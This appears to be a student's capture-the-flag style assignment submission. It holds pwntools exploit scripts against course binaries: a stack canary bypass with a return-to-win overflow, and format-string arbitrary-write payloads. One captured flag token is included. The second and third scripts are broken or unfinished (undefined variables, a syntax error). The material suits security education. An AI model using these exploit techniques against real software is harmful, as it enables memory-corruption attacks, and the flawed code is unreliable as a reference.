Yash Khandelwal, z5317349


Encountered REMOTE Shell failures that did not allow me to get remote shell access.
`
ssh: Temporary failure in name resolution
`

# Exploitation:

## Question 1:

```python
#!/usr/bin/env python3

from pwn import *

HOST = args.HOST if args.HOST else "6447.lol"
PORT = args.PORT if args.PORT else 6002

context.arch = "amd64"
context.log_level = 'info'

gdbscript = '''
continue
'''.format(**locals())

######################################
######## Establish Connection ########
######################################

def connect_binary():
    global P, E
    
    with context.local(log_level='error'):
        if args.REMOTE:
            P = remote(HOST, PORT)
        elif args.GDB:
            P = gdb.debug([f"{__file__.replace('_sol.py', '')}"], gdbscript=gdbscript)
        else:
            P = process(f"{__file__.replace('_sol.py', '')}")

    E = ELF(f"{__file__.replace('_sol.py', '')}")

######################################
############## Exploit ###############
######################################

def exploit():
    P.recvuntil(b'win function @')
    WIN = P.recvline()[:-1]
    E.address = int(WIN, 16) - E.symbols['win']
    log.info(f"Win function: {hex(E.symbols['win'])}")
    P.recvuntil(b'canary[')
    CANARY = int(P.recvline()[:-3], 16)
    log.info(f"Canary: {hex(CANARY)}")
    
    offset = 47 # from examining cyclic crash value
    payload = b"A"*offset + p64(CANARY) + b'AAAAAAAA' * 2 + b'A' + p64(E.symbols['win'])
    P.sendline(payload)
    P.interactive()

if __name__ == '__main__':
    connect_binary()
    exploit()

```

FLAG

FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiNi1rYXdhc2FraSIsImlwIjoiMTQ5LjE2Ny4xODEuMTQyIiwic2Vzc2lvbiI6IjM3MWZiNTE5LTUyMmQtNGU0Ny1iMGJkLWFiMzM3MzMyNGM4NSJ9.clFkLYN795by3LIrkinWp0458xqb0gKLmPW1xSReIlw}

## Question 2:

// Since the address of flag is known, can attempt to print the value of flag from the buffer.

Overwrite the format address with the flag address to print out the flag.

```python

#!/usr/bin/env python

from pwn import *

HOST = args.HOST if args.HOST else "6447.lol"
PORT = args.PORT if args.PORT else 6001

context.arch = "amd64"
context.log_level = 'info'

gdbscript = '''
b main
'''.format(**locals())

def connect_binary():
    global P, E
    
    with context.local(log_level='error'):
        if args.REMOTE:
            P = remote(HOST, PORT)
        elif args.GDB:
            P = gdb.debug([f"{__file__.replace('_sol.py', '')}"], gdbscript=gdbscript)
        else:
            P = process(f"{__file__.replace('_sol.py', '')}")

    E = ELF(f"{__file__.replace('_sol.py', '')}")


def build_format_string(target, goal, offset=1, bytes_to_write=8, max_size=8):
    assert max_size % 8 == 0, "Max size must be 8-byte aligned."

    if isinstance(target, int):
        target = p64(target)
    if isinstance(goal, int):
        goal = p64(goal)

    while True:
        payload = b''
        written = 0

        for i in range(0, bytes_to_write):
            byte_to_write = goal[i]

            to_write = (byte_to_write - written) % 0x100
            written = (written + to_write) % 0x100

            if to_write > 0:
                payload += f"%{to_write}c%{offset + (max_size // 8) + i}$hhn".encode()
            else:
                payload += f"%{offset + (max_size // 8) + i}$hhn".encode()

        payload_len = len(payload)

        if payload_len > max_size:
            max_size = ((payload_len + 7) // 8) * 8
            log.info(f"Increasing format string initial input size to {max_size}")
            continue

        payload = payload.ljust(max_size, b'A')

        for i in range(0, bytes_to_write):
            payload += p64(u64(target) + i)

        return payload


######################################
############## Exploit ###############
######################################

def exploit():
    P.recvuntil(b'variable @')
    FLAG = P.recvline()[:-21]
    log.info(f"Flag at {FLAG}")
    E.address = int(FLAG, 16) - E.symbols['flag']
    log.info(f"Flag at {hex(E.symbols['flag'])}")
    offset = 6 # buffer starts at this address

    # payload = b'A' * 128  # Fill the buffer (adjust if necessary)
    # payload += p64(E.symbols['flag'])  # Place the flag address on the stack
    # payload += f' %{17 + offset}$s'.encode()
    # payload += b'AA' # padding for 8 byte alignment

    payload= b'A' * 128 + f'%{offset}$n'.encode() + p64(E.symbols['flag'])
    payload = build_format_string(target=target_address, goal=E.symbols['flag'], offset=offset)
    build_format_string()

    P.sendline(payload)
    P.interactive()

if __name__ == '__main__':
    connect_binary()
    exploit()


```

## Question 3:



```python
#!/usr/bin/env python

from pwn import *

HOST = args.HOST if args.HOST else "6447.lol"
PORT = args.PORT if args.PORT else 6003

context.arch = "amd64"
context.log_level = 'info'

gdbscript = '''
continue
'''.format(**locals())

######################################
######## Establish Connection ########
######################################

def connect_binary():
    global P, E
    
    with context.local(log_level='error'):
        if args.REMOTE:
            P = remote(HOST, PORT)
        elif args.GDB:
            P = gdb.debug([f"{__file__.replace('_sol.py', '')}"], gdbscript=gdbscript)
        else:
            P = process(f"{__file__.replace('_sol.py', '')}")

    E = ELF(f"{__file__.replace('_sol.py', '')}")

def build_format_string(target, goal, offset=1, bytes_to_write=8, max_size=8):
    assert max_size % 8 == 0, "Max size must be 8-byte aligned."

    if isinstance(target, int):
        target = p64(target)
    if isinstance(goal, int):
        goal = p64(goal)

    while True:
        payload = b''
        written = 0

        for i in range(0, bytes_to_write):
            byte_to_write = goal[i]

            to_write = (byte_to_write - written) % 0x100
            written = (written + to_write) % 0x100

            if to_write > 0:
                payload += f"%{to_write}c%{offset + (max_size // 8) + i}$hhn".encode()
            else:
                payload += f"%{offset + (max_size // 8) + i}$hhn".encode()

        payload_len = len(payload)

        if payload_len > max_size:
            max_size = ((payload_len + 7) // 8) * 8
            log.info(f"Increasing format string initial input size to {max_size}")
            continue

        payload = payload.ljust(max_size, b'A')

        for i in range(0, bytes_to_write):
            payload += p64(u64(target) + i)

        return payload


######################################
### Miscellaneous Helper Functions ###
######################################

def runner(send):
    P.recvuntil(b'[s]alutations', drop=True)
    if(send in ['i', 'p', 's']):
        P.sendline(send.encode())

def say(payload):
    runner('i')
    P.sendline(payload)
    
def printer(payload):
    runner('p')

######################################
############## Exploit ###############
######################################

def exploit():
    P.recvuntil(b'pointer ')
    leak = int(P.recvline()[:-1], 16)
    offset = 9 # from examining format string output
    P.interactive()./

if __name__ == '__main__':
    connect_binary()
    exploit()

```